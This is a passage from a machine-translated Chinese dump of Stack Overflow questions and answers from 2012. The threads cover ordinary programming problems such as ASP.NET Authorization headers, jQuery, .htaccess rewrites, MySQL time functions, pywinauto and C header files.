5）您可以在任何组件收集器站点上进行大量直接 ODBC 连接，例如[http://www.torry.net/pages.php?id=570](http://www.torry.net/pages.php?id=570)

6) 与本机 MS SQL 连接相同[http://www.torry.net/pages.php?id=1513](http://www.torry.net/pages.php?id=1513)

但是，评估这些选择并做出决定需要只有您才能拥有的内部背景知识。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-11T13:40:52.520

几年前我们也遇到过同样的问题。我想如果有一个完美的解决方案，那么就不会有那么多替代方案了。

无论如何，我们从 BDE + ODBC 切换到 ADO + SQLOLEDB。主要原因是它非常可靠，易于转换，不需要在客户计算机（例如 BDE）上安装任何额外的东西，并且比 delphi 附带的其他产品更快，包括 DBX（使用 DisableControls 时）。

另外作为附带说明，如果您想使用 ODBC 来配置连接，您可以使用 ODBC 管理器来配置值，但从注册表中读取它们并直接连接而不使用 ODBC。这有助于我们进行转换。

# authorization - ASP.NET Web API 基本身份验证授权标头

> ID：12839259
> 
> 赞同：13
> 
> 时间：2012-10-11T12:12:43.437
> 
> 标签：authorization, asp.net-web-api

我有一个`BasicAuthenticationAttribute`检查请求中的 Authorization 标头，但尽管它存在，它仍然认为 Authorization 标头为空：

```
public class BasicAuthenticationAttribute : ActionFilterAttribute
{
    public override void OnActionExecuting(HttpActionContext actionContext)
    {
        if (actionContext.Request.Headers.Authorization == null)
        {
            actionContext.Response = new HttpResponseMessage(HttpStatusCode.Unauthorized);
        }

        ... 
```

如果我检查`actionContext.Request.Headers`，我可以看到`Authorization`列出：

```
{Connection: Keep-Alive
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: en-gb
Authorization: REDACTED_BUT_PRESENT==
Host: localhost:44300
Referer: https://localhost:44300/
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; InfoPath.3; .NET4.0E)
} 
```

**更新**

我刚刚检查了完整的请求标头，它们看起来像这样......我可以在第一部分看到授权标头，但第二部分中的授权标头显然为空。

request.Headers

```
{Connection: Keep-Alive
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: en-gb
Authorization: REDACTED_BUT_PRESENT==
Host: localhost:1734
Referer: http://localhost:1734/
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; InfoPath.3; .NET4.0E)
}
    base {System.Net.Http.Headers.HttpHeaders}: {Connection: Keep-Alive
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: en-gb
Authorization: VXNlcjpQYXNzd29yZA==
Host: localhost:1734
Referer: http://localhost:1734/
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; InfoPath.3; .NET4.0E)
}
    Accept: {*/*}
    AcceptCharset: {}
    AcceptEncoding: {gzip, deflate}
    AcceptLanguage: {en-gb}
    Authorization: null
    CacheControl: null
    ... removed for brevity ...
    Warning: {} 
```

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-10-11T16:02:27.550

如果你遇到这个问题，你可以使用以下方法获取标题：

```
var header = request.Headers.FirstOrDefault(h => h.Key.Equals("Authorization")); 
```

但不是通过

```
var header = request.Headers.Authorization; 
```

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2016-04-28T08:31:28.070

我自己注意到，如果 Authorization-header 仅包含密钥/令牌，则`request.Headers.Authorization`不会正确启动，因为它也在寻找格式中的方案`<Scheme> <key/token>`，即 ie `Authorization: Token VXNlcjpQYXNzd29yZA==`，那么`Authorization`将不再为 null 并包含`request.Headers.Authorization.Scheme = "Token"`和`request.Headers.Authorization.Parameter = "VXNlcjpQYXNzd29yZA=="`

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2013-01-22T22:25:16.197

我已经发布了我自己的基本身份验证属性示例。也许这会给你一些提示。

我用：

```
HttpContext.Current.Request.Headers["Authorization"]; 
```

这是完整解决方案的链接：

[http://remy.supertext.ch/2012/04/basic-http-authorization-for-web-api-in-mvc-4-beta/](http://remy.supertext.ch/2012/04/basic-http-authorization-for-web-api-in-mvc-4-beta/)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2020-09-08T10:35:13.370

虽然，这个线程很老，但如果我分享我是如何解决这个问题的，它可能会对其他人有所帮助：

请求应包含

授权：**基本**VXNlcjpQYXNzd29yZA==

代替：

授权：VXNlcjpQYXNzd29yZA==

因此请求的以下更改可能会解决问题：

```
client.Headers.Add("Authorization", "Basic VXNlcjpQYXNzd29yZA=="); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2016-05-31T06:59:00.037

为@finstas 的答案添加更多信息。

Authorization 为空，因为在创建 HttpRequestHeaders 类时会解析定义良好的 HTTP 标头，例如 Accept、Authorization 等。因此，如果请求的格式不同于 .NET 对该标头接受的格式，则该特定属性将为空。

下面是负责解析 Authorization 标头的 AuthenticationHeaderValue 类的反编译代码。类似地，对于不同的 HTTP 标头，还有其他类执行相同的操作。

希望这能提供更多信息，说明为什么 Token 和价值之间需要有一个空格。

```
internal static int GetAuthenticationLength(string input, int startIndex, out object parsedValue)
{
  parsedValue = (object) null;
  if (string.IsNullOrEmpty(input) || startIndex >= input.Length)
    return 0;
  int tokenLength = HttpRuleParser.GetTokenLength(input, startIndex);
  if (tokenLength == 0)
    return 0;
  AuthenticationHeaderValue authenticationHeaderValue = new AuthenticationHeaderValue();
  authenticationHeaderValue.scheme = input.Substring(startIndex, tokenLength);
  int startIndex1 = startIndex + tokenLength;
  int whitespaceLength = HttpRuleParser.GetWhitespaceLength(input, startIndex1);
  int index = startIndex1 + whitespaceLength;
  if (index == input.Length || (int) input[index] == 44)
  {
    parsedValue = (object) authenticationHeaderValue;
    return index - startIndex;
  }
  if (whitespaceLength == 0)
    return 0;
  int startIndex2 = index;
  int parameterEndIndex = index;
  if (!AuthenticationHeaderValue.TrySkipFirstBlob(input, ref index, ref parameterEndIndex) || index < input.Length && !AuthenticationHeaderValue.TryGetParametersEndIndex(input, ref index, ref parameterEndIndex))
    return 0;
  authenticationHeaderValue.parameter = input.Substring(startIndex2, parameterEndIndex - startIndex2 + 1);
  parsedValue = (object) authenticationHeaderValue;
  return index - startIndex;
} 
```

# jquery - 删除除特定类以外的格式

> ID：12839260
> 
> 赞同：4
> 
> 时间：2012-10-11T12:12:48.523
> 
> 标签：jquery, formatting

我正在尝试删除 a 中的所有 html 格式`<div>`，特定类除外。

我试过

```
$('div#text :not(a.keep)').contents().each(function () {
    $(this).html($(this).text());
}); 
```

但它不会改变 div 的内容。

样本输入：`<span>a </span><span><a class="keep">b</a></span> c`

所需的输出：`a <a class="keep">b</a> c`

**为什么 ？**

我为什么要这样做？我有一个 div，内容可编辑，我想格式化用户输入的内容。我有一个计时器，每隔几秒钟我就会检查 div 的内容以查找要格式化的内容，但我想保留已标记为保留的内容。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T12:18:36.240

您可以使用非选择器功能。

```
$('div#text').not(a.keep).contents().each(function () {     
    $(this).html($(this).text()); 
}); 
```

但是调用`contents()`似乎有些奇怪，它将返回文本节点以及 html 节点，并看到您正在尝试设置每个看起来很奇怪的选定元素的 html 属性（在文本节点上没有要设置的 html）

如果您想获取节点的所有文本并将该节点中的任何 html 替换为仅文本内容，则更改为

```
$('div#text').not(a.keep).children().each(function () {     
    $(this).html($(this).text()); 
}); 
```

但如果这就是你想要完成的，我会推荐

```
$('div#text').not(a.keep).children().each(function () {     
    var text = $(this).text();
    $(this).empty().html(text); 
}); 
```

因为更容易看出意图。`a.keep`如果您可以嵌套在所选元素之一中，那并不能解决递归问题

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-11T13:18:43.887

问题是你`.keep`可以在你元素的任何地方（深度）

这是另一种方法。
这个想法是获取您`#text`包含的所有元素，然后遍历每个元素以查看它是否符合您的要求。

这是一个示例

```
function getChildrenDeep(elem)
{
    var ret = [];

    $(elem).each(function(k,v){
        ret.push(v);
        if ($(v).children().length > 0) ret = $.merge(ret,getChildrenDeep($(v).children()));
    });

    return ret;
}
var plainChildren = getChildrenDeep($("#text")),
    final = '';

$(plainChildren).each(function(k,v){
    if (!$(v).hasClass("keep"))
        final += $(v).clone().children().remove().end().text(); /* See Reference */
    else
        final += $(v)[0].outerHTML;
});

document.write(final); 
```

[http://jsfiddle.net/5hjnX/4/](http://jsfiddle.net/5hjnX/4/)

[参考](https://stackoverflow.com/a/1023869/1607098)

# html - 从 div 中排除样式属性

> ID：12839262
> 
> 赞同：1
> 
> 时间：2012-10-11T12:12:50.347
> 
> 标签：html, css, properties, styles

我有这个 div：

**main.css（外部）**：

```
#content{
   padding:35px;
} 
```

然后我 php 在该 div 中包含另一个 html：

```
<div id="content"><?php include "news.html"?></div> 
```

在 news.html 内部我希望我的 #poll div 在加载到 #content 时不包含填充。

```
#poll{
padding:0px;
} 
```

那可能吗？出于某种原因，为 #poll 设置内联 css 不起作用。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-11T12:25:17.017

您可以使用负边距`#poll`来撤消包含 div 的填充。见：http: [//jsfiddle.net/635A4/1/](http://jsfiddle.net/635A4/1/)

另请参阅 CSS 中的注释，如果您在流中有更多元素，则设置正的底部边距（有时甚至是顶部）以确保流不会受到干扰，这一点很重要。

事实上，我经常使用它来为内容框提供填充，但无论如何都要让块样式标题触及边缘，而不必使用额外的包装元素。

# zend-framework2 - Zend Framework 2 没有 Vhost 配置

> ID：12839268
> 
> 赞同：4
> 
> 时间：2012-10-11T12:13:24.207
> 
> 标签：zend-framework2, vhosts

我已经使用 Zend Framework 2 完成了我的第一个 Web 应用程序，并且即将上线。但是可能网络主机不允许我更改我的虚拟主机配置！.htaccess 文件是允许的。

所以我的问题是：如何仅使用 .htaccess 文件设置我的 ZF2 应用程序？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-10-11T12:54:57.030

假设您有一个基于骨架的标准 ZF2 应用程序，然后尝试`.htaccess`在根目录中创建一个文件，其中包含以下内容：

```
RewriteEngine On

RewriteRule ^\.htaccess$ - [F]
RewriteCond %{REQUEST_URI} =""
RewriteRule ^.*$ /public/index.php [NC,L]

RewriteCond %{REQUEST_URI} !^/public/.*$
RewriteRule ^(.*)$ /public/$1

RewriteCond %{REQUEST_FILENAME} -f
RewriteRule ^.*$ - [NC,L]

RewriteRule ^public/.*$ /public/index.php [NC,L] 
```

我没有对此进行测试，但从理论上讲，这应该有效地将文档根目录移动到公共目录，同时将其保留在 url 之外。

# coding-style - 用数字前缀文件夹有哪些可能的优点和缺点？

> ID：12839270
> 
> 赞同：0
> 
> 时间：2012-10-11T12:13:43.920
> 
> 标签：coding-style, naming-conventions, directory

我的公司强烈建议对大型项目使用**以数字为前缀的子文件夹名称。**这记录在公司代码约定文章中。

这应该看起来像这样

```
ApplicationRoot/
    SomeSubFolder
        00_SubSubFolder/
        01_SubSubFolder/
        02_SubSubFolder/
    AnotherSubFolder
        00_SubSubFolder/
        01_SubSubFolder/
        02_SubSubFolder/ 
```

不知何故，这对我来说是一种无用的开销，但我对此没有有效的论据。

**也许更有经验的人可以告诉我一些场景，这些场景说明了为什么这是一个坏习惯*，或者*告诉我为什么它是好的——除了强制文件夹按特定顺序排列的可能性之外？**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-20T23:15:58.393

仅当顺序很重要时（例如运行脚本的顺序）才有用。否则很糟糕（在我看来）。论据是：

*   有些产品不允许。例如java包结构直接映射到目录结构。但包名不能以数字开头。
*   不能使用约定优于配置。一些工具在软件开发方面为您提供了很多帮助，并且他们假设您正在以与世界其他地方相同的方式进行开发（因为这是一个很好的做法）。你将有很多配置让他们接受你的结构（例如maven）
*   人类的感知。我们通过名称而不是数字来查找数据。当我导航到例如 krusader/total command 中的文件并且我有十几个目录时，我输入了一个字母，因为我知道文件夹名称。
*   混乱。如果这些数字毫无意义，那么它会给其他人带来困惑。他们总是会问“为什么”，他们总是害怕修改添加、删除，因为他们会认为有人这样做是因为一些非常重要的原因。这明显违反了 KISS 和最不意外原则（这些事情严重影响了新开发人员的准入门槛）
*   没有灵活性。有时最好有自定义文件夹名称。无论出于何种原因，例如自动搜索多个目录中的配置（通常在 java/spring 中使用）。但是要遵循这样的命名约定，要做到这一点就更加困难了。有时当您想使用自动命名翻译时，它也可能更难，因为您的目标格式可能不支持以数字开头的名称（例如登录名）
*   高架。如果没有理由保留它，则应删除任何开销。再次：亲吻
*   最后但并非最不重要的。开发人员/架构师总是对软件设计、布局、使用的技术等做出决定。如果他的手因为前一个时代的非技术官僚发明的无意义的规则而紧绷，那不过是麻烦

# sql-server - 如何找到内在SP的占用时间

> ID：12839273
> 
> 赞同：0
> 
> 时间：2012-10-11T12:13:59.880
> 
> 标签：sql-server, sql-server-2008, stored-procedures, sql-server-2008-r2

我有 1 个主程序和 5 个程序调用，我的主 SP 花费了太多时间。我想找出在 5 个过程中执行哪个过程调用需要时间。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-15T06:38:21.243

您可以在单独的表中记录每个 proc 的策略时间和结束时间，然后您可以检查哪个需要很长时间。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-12T09:27:12.890

您可以为此使用查询计划功能。[我在http://plixa.nl/how-to-read-query-execution-plans/](http://plixa.nl/how-to-read-query-execution-plans/)上为此写了一篇博文，您可以在其中了解如何获取计划以及如何阅读它

# java - 如何在 HtmlUnitDriver 中按 Enter 键

> ID：12839274
> 
> 赞同：0
> 
> 时间：2012-10-11T12:14:03.157
> 
> 标签：java, htmlunit

我正在使用 HtmlUnitDriver & FirefoxDriver。这是我的代码：

```
 HtmlUnitDriver webDriver = new HtmlUnitDriver(false); 
```

我已使用以下代码输入用户名和密码：

```
WebElement webElement = webDriver.findElement(By.xpath("some xpath here"));
 webElement.sendKeys("some value here"); 
```

它工作正常，它需要用户名和密码成功。现在我想在按下 ENTER 键后提交这个。所以请指导我如何使用 HtmlUnitDriver 对象按下 ENTER 键。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T12:21:58.630

您需要首先使用`findElement`. 这将返回一个`WebElement`.

在这个对象上你可以使用方法`sendKeys(java.lang.CharSequence... keysToSend)`。

来自 API： [http ://selenium.googlecode.com/svn/trunk/docs/api/java/org/openqa/selenium/WebElement.html](http://selenium.googlecode.com/svn/trunk/docs/api/java/org/openqa/selenium/WebElement.html)

```
sendKeys(java.lang.CharSequence... keysToSend)
Use this method to simulate typing into an element, which may set its value. 
```

您可以使用[http://selenium.googlecode.com/svn/trunk/docs/api/java/org/openqa/selenium/Keys.html#ENTER](http://selenium.googlecode.com/svn/trunk/docs/api/java/org/openqa/selenium/Keys.html#ENTER)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-11T12:22:07.030

```
WebDriver driver = new HtmlUnitDriver(false);
WebElement pw = driver.findElement(By.id("XX"));
pw.sendKeys(YY);
pw.sendKeys(Keys.ENTER); 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-10-11T12:23:03.823

```
driver.switchTo().activeElement().sendKeys(Keys.ENTER); 
```

这将发送到当前活动元素。使用`findElement`函数指定要与之交互的特定元素。

# jquery - 如何在包含 HTML 元素的单元格中使用 jQuery tablesorter 的过滤器插件？

> ID：12839282
> 
> 赞同：1
> 
> 时间：2012-10-11T12:14:27.977
> 
> 标签：jquery, html, tablesorter

我正在尝试将 tablesorter 插件的过滤器插件与包含 html 元素的单元格一起使用。不幸的是，效果并不好。我得到的只是过滤器列表中的一个条目，每个选择选项都连接在一起。我试图添加一个自定义 textExtraction 函数，但这并没有改变任何东西。可以在这里找到我的代码示例：http: [//jsfiddle.net/ZMzNf/10/](http://jsfiddle.net/ZMzNf/10/)有 什么想法吗？

提前谢谢，干杯

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T14:50:10.083

在 2.4 版中，我添加了一个`filter_useParsedData`选项，它强制过滤器小部件对整个表使用已解析的数据，或者您可以将类名添加`filter-parsed`到表头以针对单个列。

[在文档](http://mottie.github.com/tablesorter/docs/#widget-filter-useParsedData)中获取有关如何使用此选项的更多详细信息。另请查看[这个问题](https://github.com/Mottie/tablesorter/issues/149)- 它表明您可以使用 textExtraction 函数来控制解析的数据。

# javascript - 使用css更改为gmail中的自定义光标

> ID：12839287
> 
> 赞同：1
> 
> 时间：2012-10-11T12:14:41.797
> 
> 标签：javascript, css, email, cursor, gmail

我正在尝试将光标更改为自定义光标的邮件。它适用于我的 mac 邮件客户端。但是在 chrome (gmail webclient) 上，Gmail 似乎剥离了那段代码。

```
cursor: url(http://www.myurl.com/mailings/client/realhand.cur), default !important; 
```

帮助？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T12:16:46.873

任何体面的邮件客户端至少应该在从网络下载资源（而不是嵌入在邮件本身中的资源）之前询问，因为这是跟踪某人是否打开邮件（和/或做更多邪恶的事情）的经典方法。（这是熟悉的“此消息中的图像已被阻止。单击此处显示图像。”）

您也许可以使用[数据 URI](http://en.wikipedia.org/wiki/Data_URI_scheme)嵌入光标，但它不会在所有浏览器中可靠地显示。

# android - 选项卡中的 Android 应用程序布局不正确 - 在移动设备中很好。怎么修？

> ID：12839288
> 
> 赞同：0
> 
> 时间：2012-10-11T12:14:41.330
> 
> 标签：android, android-layout, android-view, android-tabs

我在android中创建了一个应用程序。应用程序布局工作正常，就像我在移动设备中制作的那样，但布局中的 ImageButtons 在屏幕尺寸比移动设备大的选项卡中扭曲？我不想为每个屏幕尺寸创建不同的布局。有没有其他解决方案？请帮助示例代码赞赏

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T12:24:21.287

请提及 XML 代码。如果您使用的是像素 (PX) 或 wrap_content 而不是使用密度独立像素 (DIP) 而不是那个

# c# - MemoryMappedViewAccessor.ReadArray<> 抛出 IndexOutOfRangeException

> ID：12839290
> 
> 赞同：0
> 
> 时间：2012-10-11T12:14:43.153
> 
> 标签：c#, memory-mapped-files

我正在尝试从内存映射文件中读取 c 样式的 unicode 字符串并`IndexOutOfRangeException`发生了，所以我通过逐个字符复制 char 来修复它，但我想使用`ReadArray`，它更具可读性。

```
MemoryMappedFile file = MemoryMappedFile.OpenExisting("some name");
MemoryMappedViewAccessor view = file.CreateViewAccessor();
int len = (int)view.ReadUInt64(0); // Length of string + 1 is stored.
char[] buffer = new char[len];
//view.ReadArray<char>(0, buffer, sizeof(UInt64), len); // EXCEPTION
for (int i = 0; i < len; i++) // char by char, works fine.
    buffer[i] = view.ReadChar(sizeof(UInt64) + sizeof(char) * i); 
```

试图找到一个简短的例子来展示如何使用`ReadArray<>`，但我做不到。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T12:20:45.190

在 中[`ReadArray`](http://msdn.microsoft.com/en-us/library/dd267761.aspx)，您使用第一个参数指示所需的位置，并将数组内的偏移量作为第三个参数：

```
public int ReadArray<T>(
    long position,
    T[] array,
    int offset,
    int count
) 
```

所以：

```
view.ReadArray<char>(0, buffer, sizeof(UInt64), len); 
```

是说在索引处填充数组`sizeof(UInt64)`to `sizeof(UInt64) + len - 1`- 这总是会溢出可用的索引值（假设`sizeof(UInt64)`大于 0 :-)）。

尝试：

```
view.ReadArray<char>(sizeof(UInt64), buffer, 0, len); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-11T12:21:26.490

在 ReadArray 中，参数 1 和 3 应该交换。

VS 2010 的 Intellisense 错误地描述了 ReadArray<> 的参数。

(may vary with language/locale of VS)

# mysql - 哪个更好用：ADDTIME 或纯 INTERVAL 来创建时间？

> ID：12839292
> 
> 赞同：0
> 
> 时间：2012-10-11T12:14:48.203
> 
> 标签：mysql

以下是两个示例查询：

```
SELECT NOW(), NOW() + INTERVAL 1 HOUR + INTERVAL 1 MINUTE + INTERVAL 1 SECOND;
SELECT NOW(), ADDTIME( NOW(), '1:01:01' ); 
```

这两个查询之间有什么区别吗？我的意思是，在性能或*最佳实践*用途中？

据我测试，这个`INTERVAL`似乎有稍长的执行时间。

***编辑：*** 100'000 次循环的结果几乎总是这样：

```
Interval:  8.5930590629578 seconds.
Addtime:   8.2951309680939 seconds. 
```

```
SELECT NOW(), NOW() + 3661 SECOND;

Single interval:  8.3964569568634 seconds.
Interval:         9.1104879379272 seconds.
Addtime:          8.7062540054321 seconds. 
```

***EDIT2：***新示例：

```
SELECT NOW(), NOW() + 1 SECOND;
SELECT NOW(), ADDTIME( NOW(), '0:00:01' ); 
```

时间结果：

```
Single interval:  8.4611599445343 seconds.
Addtime:          8.7186510562897 seconds. 
```

解析是否`ADDTIME`总是会减慢它的速度，以至于可以很好地看出差异？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-11T14:27:29.510

真正的问题是，这是否真的是您正在寻找的一种性能提升。运行这 100K 次显示差异为 0.02 秒。因此，如果您运行它 500 万次，您将节省一秒钟。

比较两者是不公平的，因为`interval`必须进行 3 次计算（小时/分钟/秒）。这会减慢它的速度。

将`ADDTIME()`不得不解析时间，这也会减慢它的速度。

然后，如果您正在寻找性能，请使用：

```
 NOW() + INTERVAL 3661 SECOND 
```

但即便如此，您也可以节省几毫秒。如果这确实是您的应用程序的瓶颈，那么您做得很好:)。

# python - 如何等到 pywinauto 中出现所需的窗口标题

> ID：12839293
> 
> 赞同：1
> 
> 时间：2012-10-11T12:14:50.207
> 
> 标签：python

**如何使用pywinauto**等到所需的窗口标题出现？

我必须等待所需的窗口标题，一旦我发现窗口标题必须对该窗口执行一些操作。我怎么能做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-16T08:25:09.227

最简单的方法是使用`pywinauto.timings.WaitUntilPasses`

```
app = pywinauto.Application()
app.start('calc')
window = pywinauto.timings.WaitUntilPasses(10, 0.5, lambda: app.window_(title=u'About Calculator'))
#run About manually in 10 seconds
<pywinauto.application.WindowSpecification object at 0x02DD0DB0> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-18T07:18:39.287

好的，现在我知道了如何使用`WaitUntilPasses`我在小脚本下面尝试的这种方法。

```
app = pywinauto.Application() 
app.start('Notepad') 
Win = "Untitled1.txt" + "-" + "Notepad" 
window = pywinauto.timings.WaitUntilPasses(20, 0.5, lambda: app.window_(title=Win))
app.Untitled1.MenuSelect('Help -> About Notepad') 
```

在 20 秒内打开记事本后，我保存了记事本，`Untitled1.txt`并在保存记事本的记事本标题后显示，如`"Untitled1.txt - Notepad"`在上面的脚本中，我正在等待相同的标题，一旦我得到相同的标题，试图在该记事本中选择菜单选项但是在到达这里 20 秒后，出现超时错误。

# java - 未分配的可关闭流

> ID：12839301
> 
> 赞同：3
> 
> 时间：2012-10-11T12:15:03.687
> 
> 标签：java, stream

我正在使用 Eclipse Juno，在编写以下代码时，Eclipse 会警告我可能存在内存泄漏：

```
String s = new Scanner( System.in ).nextLine(); 
```

事实上，我从不关闭 System.in 流。JVM（jre7）如何处理这个？好用吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-11T12:19:46.133

这是一个虚惊一场，我相信。Eclipse 将其与以下内容混淆：

```
String s = new Scanner(new FileReader("foo.txt")).nextLine(); 
```

每次执行它时都会泄漏一个新的Closeable *。*

但在您的代码中，底层流 ( `System.in`) 仍然可以访问和使用。当然，从“资源泄漏”的角度来看，没有*必要*关闭它。

* * *

> 事实上，我从不关闭 System.in 流。JVM（jre7）如何处理这个？

流保持打开状态，`System.in`直到（可能）应用程序退出。但是，如果你一开始没有打电话`new Scanner(System.in)`，情况并没有什么不同。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-11T12:21:49.063

**我的回答无效，详情见评论。OP，请接受另一个。**

JVM 将保持资源打开，直到您关闭它或程序退出。Eclipse 的警告看起来不错。在 Java 7 上，您可以使用 try-with-resources 模式：

```
try (Scanner scanner = new Scanner(System.in)) {
    scanner.nextLine();
} 
```

这将在 try 块结束时自动关闭 Scanner。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-12-04T18:04:21.313

您可以放心地忽略这一点。

如果它`Scanner`也是可关闭的`Closeable`，`Scanner::close`那么它也会关闭基础阅读器。

下面是 的代码`Scanner::close`。

```
public void close() {
    if (closed)
        return;
    if (source instanceof Closeable) {
        try {
            ((Closeable)source).close();
        } catch (IOException ioe) {
            lastException = ioe;
        }
    }
    sourceClosed = true;
    source = null;
    closed = true;
} 
```

# matlab - 图像中使用的位数

> ID：12839304
> 
> 赞同：0
> 
> 时间：2012-10-11T12:15:20.063
> 
> 标签：matlab, bits

如何获取图像中使用的位数`Matlab`？

谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-11T12:20:43.773

如果您指的是图像的位深度（即编码一个像素使用多少位），请尝试使用图像处理工具箱的功能`imfinfo`

[链接到文档](http://www.mathworks.com/help/matlab/ref/imfinfo.html)

以下是您可以使用它的方法：

```
info = imfinfo('your_image.jpg') # put your filename, matlab recognizes many image formats
bitdepth = info.BitDepth 
```

# c - 使用头文件时 C 程序未编译

> ID：12839314
> 
> 赞同：1
> 
> 时间：2012-10-11T12:15:58.363
> 
> 标签：c, linux, gcc, compiler-construction

（C 程序）我正在尝试编译使用标头的 main.c，但出现以下错误。当我不使用标题（主文件中的所有方法）时，一切正常。

在字符串 S 中，程序查找所有出现的单词并返回出现次数最多的单词。

我正在编译使用：`gcc main.c`

谢谢你。

**错误**

```
In file included from main.c:9:0:
frequence.h:4:16: warning: useless storage class specifier in empty declaration [enabled by default]
main.c: In function ‘main’:
main.c:15:10: error: variable ‘word’ has initializer but incomplete type
main.c:15:10: warning: passing argument 1 of ‘show_all_words’ from incompatible pointer type [enabled by default]
frequence.h:6:17: note: expected ‘char *’ but argument is of type ‘char (*)[34]’
main.c:15:10: error: invalid use of undefined type ‘struct stat_mot’
main.c:15:19: error: storage size of ‘word’ isn’t known 
```

**主程序**

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "frequence.h"

#define LONGUEURMAX 4

int main(char *argv[]) {
  char texte[] = ";! one two, tree foor one two !:;";
  struct stat_mot word = show_all_words(&texte);

  printf("%s : %d\n", word.word, word.frequency);

  return (EXIT_SUCCESS);
}; 
```

**频率.h**

```
#ifndef DEF_FREQUENCE
#define DEF_FREQUENCE

typedef struct stat_mot;
int count_word(char * , char * );
struct stat_mot show_all_words(char *);

#endif 
```

**频率.c**

```
#include "frequence.h"

typedef struct stat_mot {
    char * word;
    int frequency;
} stat_mot;

int count_word(char * mot, char * text) {
  int n = 0;
  char *p;

  p = strstr(text, mot);  
  while (p != NULL) {
    n++;
    p = strstr(p + 1, mot);
  }  

  return n;
}

stat_mot show_all_words(char * text) {
    char * text_rw = strdup(text);
    char * p = strtok(text_rw, " .,;:-!?");

    char word_to_return[strlen(text)];
    int  word_frequence = 0;

    while (p != NULL) {
      if (strlen(p) >= 0) {
        int offset = p - text;
        int count = count_word(p, text);

        if (word_frequence < count) {
          strcpy(word_to_return, p);          
          word_frequence = count;
        }
      };

      p = strtok(NULL, " .,;:-!?");
    }

    free(text_rw);
    struct stat_mot word = { word_to_return, word_frequence };
    return word;
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-11T12:18:48.370

至少，您需要将 frequence.c 的定义`stat_mot`移至 frequence.h。`main()`尝试创建它的实例，如果没有结构定义，您将无法做到这一点。

还有一些其他问题：

*   我很难相信`char*`和之间的类型不匹配`char(*)[34]`可以通过将所有内容放入一个文件中来解决。因此，我希望该修复与您将代码组织到文件中无关，只是您应该通过`texte`，而不是`&texte`.
*   “空声明中的无用存储类说明符” - 是一个令人困惑的错误消息，但它的出现是因为在 C 语法`typedef`中是一个存储类说明符。不要问为什么。基本上，`typedef struct stat_mot;`是错误的，但这没关系，因为您可以在移动结构定义时将其删除。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-11T12:18:31.257

您的结构定义必须在标题中。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-11T12:19:37.610

头文件只对定义有用——例如编译确实有效，但链接器不知道在哪里寻找函数的主体。

尝试编译`gcc main.c frequence.c`

另外，`typedef struct stat_mot;`没有太多意义——`struct stat_mot`此时没有定义，而且，你没有用 this 给它一个新名称`typedef`。我认为即使允许分离结构定义也没有意义 - 毕竟，如果你只是分发头文件，人们应该知道如何使用结构（例如，看看它包含什么）

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-10-11T12:20:14.853

您在头文件中*声明*结构（前向声明），但在源文件中*定义*它。因此它不能从.`stat_mot`*`frequence.c``main.c`*

 ** * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-10-11T12:20:21.057

只需将结构声明放入头文件即可：

```
/* in frequence.h */
struct stat_mot {
    char* word;
    int frequency;
}; 
```

所以两个翻译单元（即`.c`文件）都能看到它。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-10-11T12:28:27.823

你必须把你的`stat_mot`结构放在`frequence.h`.

此外，`main()`应该声明为

```
int main(int argc, char **argv) 
```

并且`texte`应该是`char *`：

```
int main(char *argv[])
{
    char *texte = ";! one two, tree foor one two !:;";
    struct stat_mot word = show_all_words(texte); 
```

您还应该包含`<string.h>`and `<stdlib.h>`，`frequence.c`因为您使用`strstr`,`strlen`和`free`。

In `frequence.c`,`strlen`总是大于或等于零，所以比较总是正确的。

* * *

## 回答 #7

> 赞同：0
> 
